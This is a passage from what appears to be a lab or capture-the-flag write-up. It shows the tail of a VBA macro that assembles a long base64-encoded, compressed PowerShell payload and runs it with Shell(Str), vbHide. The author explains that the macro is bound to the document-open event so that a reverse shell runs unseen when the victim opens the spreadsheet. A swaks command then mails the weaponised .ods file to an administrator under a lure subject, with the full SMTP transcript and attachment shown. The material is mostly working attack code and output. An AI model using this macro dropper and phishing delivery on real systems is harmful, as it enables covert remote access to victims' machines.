Str = Str + "GQAOQA1AGkAQQBSAFcAZABsAGMAVQBjAEwAbAA0AGgAOQAvAEY"
Str = Str + "ASgBYAHAAVwBXADEAVwBiAG4AOQBMAEUASQAzAGwAbwByAG0AT"
Str = Str + "ABPAFEANwBLAEwAcQBWAEYAUgBmAHEAaABDAEkAYwBQAHUAeAB"
Str = Str + "XAFcAaQB3AFoAeABJAGgAWQB6AGoANQBkAEgASgBEAHkAdgBsA"
Str = Str + "DYAewAyAH0AdwBSAGgANgArAEIAVwB0AHIAYgBHAEEAKwBaADI"
Str = Str + "ANQBjAGgATgB1ADgAMwBDAGYAQwBQAEkAbgBDADcARgByAEMAe"
Str = Str + "gBrAEYASwBMAHMATABqAEkARwBLAE8ANgByAG8AUgBqAHUATgB"
Str = Str + "pAHsAMQB9AFoAbwBLAEQAOQBQAFoANwBIAGQANQBtAHIAbQAvA"
Str = Str + "FQAewAyAH0ASgBPAEEAbAB6AFcAUQA0ADQAagB0AGoASgB4AHQ"
Str = Str + "AQwBZAE8AagBzAHQAZABGAEwAbwBVADMAMgBOAHYAQgBsAG8Ab"
Str = Str + "QBqAHsAMgB9AGoAbwAnACcAKwAnACcAegB4ACcAJwArACcAJwB"
Str = Str + "RAEYAeABOAFoAcwBpAGUAVgBDAG0ARgBCAGEAawB2ADYATABHA"
Str = Str + "GYAawBXAGIAMwBMAHcAMwBxAHMAawBIAHkAdQBCADEASQBCAEg"
Str = Str + "AewAxAH0AZwBuAHsAMQB9AGUAdQBxAGkAQgBuAE0AVABpAGcAK"
Str = Str + "wBxAHgAUgBPAFIAcABsACcAJwArACcAJwB4AFEAWQBPAFYAOAB"
Str = Str + "BAEEAaAAvAEMAQgB7ADEAfQA5AG4ARQBMAHgAeQBKAG0AYwBJA"
Str = Str + "E4ASABMAFIAcgA2AG0ANgBRACcAJwArACcAJwBtAEcAbwBPAFU"
Str = Str + "AQgBpAHsAMgB9AG0AcQAvAEYAVwBxAGwAaQBRAEQAdgBDAFAAT"
Str = Str + "wBvAGgAMgA4AEYAaAA2AGkAQgBDAHUAegBaADgAaQBsAEEAagA"
Str = Str + "nACcAKwAnACcAawB2AHYAZABkAFcATABWAGMAVQBhAHQAOQB1A"
Str = Str + "EIAaQBiAHMAVABXADEARwAzACcAJwArACcAJwBOAG0ATABoAFY"
Str = Str + "AYwBVAEsATABpAFQAaQBaAEIANQBtADgAOAB0ADcASgBFAFEAd"
Str = Str + "AAzAFkAaABDAG8AaQBUAFUAMQBZACcAJwArACcAJwArAGwAUgB"
Str = Str + "YAHMAVQBaAHcAaQBVAHMANwBGAGIAaQBGAEMAdQBaAGcAZABZA"
Str = Str + "EwAZQBGAEsAZgBZAFIARgB6AEEATABjAHYAeQBrADEAZwA0AEk"
Str = Str + "AZgA5AGIAVgBFAGsASgBkAEgASwBrAE8AWgBEAGEARwBxAEMAR"
Str = Str + "ABwAHkAdQB0AGcARABwAG0AVABpADMAcABvADQAQQBEAEEATwA"
Str = Str + "3AHcARABXAHcAcwBlAEYAQQByAE8AcABiACcAJwArACcAJwBQA"
Str = Str + "GkAMgBPAFgAZQB4AFQAcwBJAEYAWgBzAFUAeABYAEYASgBHAGk"
Str = Str + "AUgBRAHEAVQA1AEoATQBqAEcAaQAyAEMAMQBKAGEAaABpAFQAN"
Str = Str + "wBFAGgATgBPAEUAcwBmAGkAeQAvAGgARwBnAG4AbAB4AEUARQB"
Str = Str + "4AHoAOAAzAE4AbABOAGQAbwBaAGwANgBiAEwASQB4ADUAbABEA"
Str = Str + "GkAUQBWAFUARABnAHcAVgB4AGgAaAB5AEEAcQBBAEMAbABKAFg"
Str = Str + "AZQBKAGkAYgBXAGMAewAxAH0AUAAvAGQAZQBQAEEAbABIAEUAM"
Str = Str + "QBFAEsANQBRAE8AVwAxAHAAQQBPADIAQgBFAHcAbQBGAHgAdwB"
Str = Str + "KAFkASgBBAGcAUgBkAEsAMgBjAFIAYwBEADEAWQBVAEIAeQBDA"
Str = Str + "FIAdABvAHsAMgB9AE8AUgBUADQAewAyAH0AaQBhAHgARQBVAG0"
Str = Str + "AbwBoAEgANwB2AEYAewAyAH0AMQBIAG0AZABYAEEAZwB2AFUAQ"
Str = Str + "QBsAGgAKwBNAG8AUgBrAGkAMQB7ADEAfQBSAGsAdgB7ADEAfQB"
Str = Str + "UAGEASgBPAFAAUQBnAGcAWABCAEsAcgB2ADgAUgB3ADgALwBOA"
Str = Str + "CcAJwArACcAJwBSAHcAVABUAGoASABDAFcARwBEAG0AdgByAHE"
Str = Str + "AbQAyADQANABMACsAQgBXAC8AQgBCAFUARQB6AGUARgBJAHcAS"
Str = Str + "QBnADUAQQBkAEMASQBXAGEAQwBqAEcAbgB4AHUASABMAGkATgA"
Str = Str + "vAHEAdAB5AFIAcABnAHAAcgByAEkAZgBVAGMATABRAGwAcQBhA"
Str = Str + "GsAYgBVAHQAJwAnACsAJwAnAE0ATgArAEYAbgBrAFgARwBlAHQ"
Str = Str + "AQwAvAGUAbQB0ACsAaABXAG8AdABaADIANwBxAGwANgByAEIAd"
Str = Str + "gBkAFEAVwB2AFkANwBUAGIAVwBQAGQATgB1AGMATABPAHQAOAA"
Str = Str + "1AHUAQgB6AG8AMwAyADQAMgBKAGgAcQB0ADEANwBhADgAdwBuA"
Str = Str + "HUAdABwADkASQBOAFgAbAB1AEwARgBmADkAYwBqAGUANwBLAHY"
Str = Str + "AdQBlAEYAdgA1AHYATgBmADIAbQA2AHEAMgAzAHsAMQB9ADkAO"
Str = Str + "AAxAHgAdQAzAFAATQArAC8AOABNAHoANwAyAG0AOABkAHsAMgB"
Str = Str + "9AGgAOAAxAGgAMQBxADEAagB2AHEAdABkAHQASQBmAGEAUgB1A"
Str = Str + "HQAMgBvAGoAYgBaAE4ATQBkAEUAbQB1ADQANwBIAFgANAB7ADI"
Str = Str + "AfQA5AGkAbQB5AFAASQBxAC8AbQBQAHQARQBwAEYAdABQADEAc"
Str = Str + "gBZAE4AVwAnACcAKwAnACcAYgBzAGQAVgBXADkAbgBwADgANwA"
Str = Str + "rADUANQBuAFgAOAAnACcAKwAnACcAOABOAGQAegBmAHUAVgBpA"
Str = Str + "DUASABqAGEAWABhAFYAdABWAG0AMgBMAFkANwBHAHIAcwBaAGE"
Str = Str + "ANQBFADYAcQBOAGgAVwBSAHgAdABhAGIAVwB7ADIAfQA0AGgAT"
Str = Str + "AAzAFAAJwAnACsAJwAnAGYAcwBWAHIAdwBCADYAdABzAHcANAB"
Str = Str + "5AG0AcQB5AFAASgBrAHoAMQBWAHsAMQB9ADEAcABoAEEARwBhA"
Str = Str + "GEAeQBPADcAVABpAGEAcgB4AC8AcwA1ADIATwBwAEEAQwBFAGE"
Str = Str + "AbAAyAHQAQgBkAHYARwBWAGYAKwBpAE4AaQByAHkAcwAyAHUAc"
Str = Str + "gA3AGwARQA3AFgAWgBhADkAVABjAFIAMwB2AGYAcgBhAE4ANQB"
Str = Str + "iADIASQBuAC8AYwB0AEoANwBMAFoANwByAFkAMgBtAGoAbQB2A"
Str = Str + "HQAbgB0AGEANgBWAHQAdgAzAGwAdABXAFoAagBPAHoAbABaAFA"
Str = Str + "AUgBBAEoAeQBPAHIATgBtAEgAWQAyACcAJwArACcAJwBWAFQAb"
Str = Str + "QBZAEkATgBnADcAYwA1AGUAUABsAFcATQBhADEAKwBmAGIAMgB"
Str = Str + "zACsAKwBMAHAASQA3AFEAYwBrAG8ARQA5ADEAdAAzAEoAcABmA"
Str = Str + "GQASABDAHoAWQB7ADIAfQAvAFcAUAB2AHUAYwBIAFIAeAB2ADc"
Str = Str + "AMwBkAFAAZABXAFoAYQBsAFUAcQA5AGkAJwAnACsAJwAnAGYAS"
Str = Str + "QA5AGQAUQBpAEkAVAArAHYAegB3AHAAcwAnACcAKwAnACcAZQB"
Str = Str + "MAE8AbwBpAFcANwA0ADgAVQBPAEIAagBXAHQASABLAFgAKwByA"
Str = Str + "DIAJwAnACsAJwAnAHgAcwBvAGkAdQBlAEkAQQBoAFcAZwBpACs"
Str = Str + "AZgBWADIARwBGAFIASgArAHYATABBAHsAMgB9AGEARQBoAGkAe"
Str = Str + "gBEAGkARgAvAGkASwBNAFEAVQBaAGkASgBNAHoAWgB6AEcASwB"
Str = Str + "xAFgATQBFAFcATQBoADcAZAA4AHcAawBnADYARABRAHMAdwB0A"
Str = Str + "HsAMQB9AHsAMgB9ACsARABPAHYAVwBrAHsAMQB9AE0AKwBDAHk"
Str = Str + "AcwB1AHsAMgB9AHkATABlAHUAcgBpAFkAUQBvACsAaABBAEMAM"
Str = Str + "QA3AHUANAA5AEQAbgA4ADEASgAxAGUAMQA2AHQAUQBwAE8AdgB"
Str = Str + "iAHEAdQBOAHQAQQBMAGUAZgA3AEUAbQBXACsAMQBrAFkAYQBzA"
Str = Str + "GsAcABvAFQAQQBKAFQATgBOAFUAOQBOAGcAagBYAGkAewAxAH0"
Str = Str + "ATABQACcAJwArACcAJwA5AHEAcABPAEIAYgBnAEUATgBQAGUAa"
Str = Str + "AB1AHIAdAAyAEEARAB6AHsAMgB9AHYAbwBJAHQARABUAEQAcgB"
Str = Str + "VAHQAdwBOAE0AWQBvADgAZgBRAEgAVwA3ADEAegBJAE0AagA0A"
Str = Str + "EEAQwB4AEcAbAB4ADcASwByADQAQwBEAHYAdwBBAEEAMgBmADQ"
Str = Str + "AbQAxAFQAZwBZAGsAUQBlAGoAOQB6AEMATQB2AG0AVgBqAE0Ab"
Str = Str + "gA2AHsAMgB9AHgAegArADMASAA5AGoAegBNAHYAZQBQADUAeQA"
Str = Str + "rAGkAewAyAH0AWABWAFUAbwByAE4AVAA3AHUAdgBOADQANABhA"
Str = Str + "CsAeQArADcALwB3AGcAUgBEAG4ASQBtAHQARgBtAEsARAAxAFA"
Str = Str + "ALwBOAEEAeABaAGoAUgB4AGwAZAA1AGwAQQBBAFgAagBaAEUAb"
Str = Str + "AAvAEQAZAB3AGsALwB1ADQAVgB2AHEANwBUAFAALwB3ADEAcgA"
Str = Str + "2AHcAVABuAGgAdwBzAEEAQQBBAHsAMAB9AHsAMAB9ACcAJwApA"
Str = Str + "C0AZgAnACcAPQAnACcALAAnACcAUwAnACcALAAnACcAMAAnACc"
Str = Str + "AKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8Ab"
Str = Str + "QBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQB"
Str = Str + "vAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzA"
Str = Str + "CkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADs"
Str = Str + "AJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAP"
Str = Str + "QAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdAB"
Str = Str + "TAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1A"
Str = Str + "GUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEg"
Str = Str + "AaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AV"
Str = Str + "wBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQB"
Str = Str + "zAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByA"
Str = Str + "G8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA="
Str = Str + "="
	
	Shell(Str), vbHide
	
End Sub
```

Mapped macro to "Open Document" function, so when the user openes up the file our reverse shell get's executed, without even him seeing the content, due to the "vbHide" flag.

We can utilize an tool called "swaks" in order to authenticate with an user and send an mail.

```
swaks -t mailadmin@localhost --from jonas@localhost --attach @exploit.ods --server 192.168.145.140 --body 'Please check this spreadsheet' --header 'Subject: Please check this spreadsheet'
=== Trying 192.168.145.140:25...
=== Connected to 192.168.145.140.
<-  220 localhost ESMTP server ready.
 -> EHLO kali
<-  250-localhost Hello kali; ESMTPs are:
<-  250-TIME
<-  250-SIZE 0
<-  250 HELP
 -> MAIL FROM:<jonas@localhost>
<-  250 Sender OK - send RCPTs.
 -> RCPT TO:<mailadmin@localhost>
<-  250 Recipient OK - send RCPT or DATA.
 -> DATA
<-  354 OK, send data, end with CRLF.CRLF
 -> Date: Mon, 10 Nov 2025 12:05:15 -0500
 -> To: mailadmin@localhost
 -> From: jonas@localhost
 -> Subject: Please check this spreadsheet
 -> Message-Id: <20251110120515.009845@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_9845"
 -> 
 -> ------=_MIME_BOUNDARY_000_9845
 -> Content-Type: text/plain
 -> 
 -> Please check this spreadsheet
 -> ------=_MIME_BOUNDARY_000_9845
 -> Content-Type: application/octet-stream; name="file.ods"
 -> Content-Description: file.ods
 -> Content-Disposition: attachment; filename="file.ods"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> 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
